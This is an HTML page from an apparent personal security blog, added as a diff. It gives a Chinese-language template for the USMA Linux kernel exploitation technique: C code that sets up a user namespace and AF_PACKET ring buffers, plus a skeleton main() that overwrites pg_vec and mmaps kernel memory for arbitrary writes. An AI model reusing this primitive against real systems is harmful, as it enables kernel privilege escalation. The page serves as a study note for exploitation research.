@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>USMA</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./USMA.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">USMA</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2026-02-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="ban-zi">板子</h2><p>使用：
+通过漏洞修改pgv中的地址为想要的内核地址，再进行mmap，就能在用户空间直接修改内核数据</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">unshare_setup</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> temp_fd;
+</span><span style="color:#c0c5ce;">    uid_t uid = </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    gid_t gid = </span><span style="color:#8fa1b3;">getgid</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buffer[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unshare</span><span style="color:#c0c5ce;">(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET))
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">unshare(CLONE_NEWUSER | CLONE_NEWNS)</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    temp_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/setgroups</span><span style="color:#c0c5ce;">&quot;, O_WRONLY);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(temp_fd, &quot;</span><span style="color:#a3be8c;">deny</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">deny</span><span style="color:#c0c5ce;">&quot;));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(temp_fd);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    temp_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/uid_map</span><span style="color:#c0c5ce;">&quot;, O_WRONLY);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">snprintf</span><span style="color:#c0c5ce;">(buffer, sizeof(buffer), &quot;</span><span style="color:#a3be8c;">0 </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> 1</span><span style="color:#c0c5ce;">&quot;, uid);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(temp_fd, buffer, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(buffer));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(temp_fd);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    temp_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/gid_map</span><span style="color:#c0c5ce;">&quot;, O_WRONLY);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">snprintf</span><span style="color:#c0c5ce;">(buffer, sizeof(buffer), &quot;</span><span style="color:#a3be8c;">0 </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> 1</span><span style="color:#c0c5ce;">&quot;, gid);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(temp_fd, buffer, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(buffer));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(temp_fd);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">create_socket_and_alloc_pages</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">nr</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tpacket_req req;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> socket_fd, version;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    socket_fd = </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(AF_PACKET, SOCK_RAW, PF_PACKET);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(socket_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        ret = socket_fd;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_out;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    version = TPACKET_V1;
+</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, sizeof(version));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed at setsockopt(PACKET_VERSION)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_setsockopt;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(req));
+</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_block_size </span><span style="color:#c0c5ce;">= size;
+</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_block_nr </span><span style="color:#c0c5ce;">= nr;
+</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_frame_size </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_frame_nr </span><span style="color:#c0c5ce;">= (req.</span><span style="color:#bf616a;">tp_block_size </span><span style="color:#c0c5ce;">* req.</span><span style="color:#bf616a;">tp_block_nr</span><span style="color:#c0c5ce;">) / req.</span><span style="color:#bf616a;">tp_frame_size</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed at setsockopt(PACKET_TX_RING)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_setsockopt;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> socket_fd;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">err_setsockopt:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(socket_fd);
+</span><span style="color:#c0c5ce;">err_out:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">packet_socket_setup</span><span style="color:#c0c5ce;">(uint32_t </span><span style="color:#bf616a;">block_size</span><span style="color:#c0c5ce;">, uint32_t </span><span style="color:#bf616a;">frame_size</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                        uint32_t </span><span style="color:#bf616a;">block_nr</span><span style="color:#c0c5ce;">, uint32_t </span><span style="color:#bf616a;">sizeof_priv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">timeout</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(AF_PACKET, SOCK_RAW, </span><span style="color:#8fa1b3;">htons</span><span style="color:#c0c5ce;">(ETH_P_ALL));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] socket (AF_PACKET)</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> v = TPACKET_V3;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> rv = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(s, SOL_PACKET, PACKET_VERSION, &amp;v, sizeof(v));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rv &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] setsockopt (PACKET_VERSION)</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tpacket_req3 req3;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req3, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(req3));
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_sizeof_priv </span><span style="color:#c0c5ce;">= sizeof_priv;
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_block_nr </span><span style="color:#c0c5ce;">= block_nr;
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_block_size </span><span style="color:#c0c5ce;">= block_size;
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_frame_size </span><span style="color:#c0c5ce;">= frame_size;
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_frame_nr </span><span style="color:#c0c5ce;">= (block_size * block_nr) / frame_size;
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_retire_blk_tov </span><span style="color:#c0c5ce;">= timeout;
+</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_feature_req_word </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    rv = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(s, SOL_PACKET, PACKET_RX_RING, &amp;req3, sizeof(req3));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rv &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] setsockopt (PACKET_RX_RING)</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_ll sa;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;sa, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(sa));
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_family </span><span style="color:#c0c5ce;">= PF_PACKET;
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_protocol </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">htons</span><span style="color:#c0c5ce;">(ETH_P_ALL);
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_ifindex </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">if_nametoindex</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">lo</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_hatype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_halen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_pkttype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_halen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    rv = </span><span style="color:#8fa1b3;">bind</span><span style="color:#c0c5ce;">(s, (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *)&amp;sa, sizeof(sa));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rv &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] bind (AF_PACKET)</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> s;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">unshare_setup</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> block_nr = ?? / </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// count 为 pg_vec 数组的大小, 即 pg_vec 的大小为 count*8                  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 第一个参数 block_size/4096 为要分配的 order        
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> packet_fds = </span><span style="color:#8fa1b3;">packet_socket_setup</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x800</span><span style="color:#c0c5ce;">, block_nr, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">	xxx </span><span style="color:#65737e;">// overwrite pg_vec
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*page = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000 </span><span style="color:#c0c5ce;">* block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">page</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	page[??] = ??; </span><span style="color:#65737e;">// arb_write
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ban-zi">板子</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
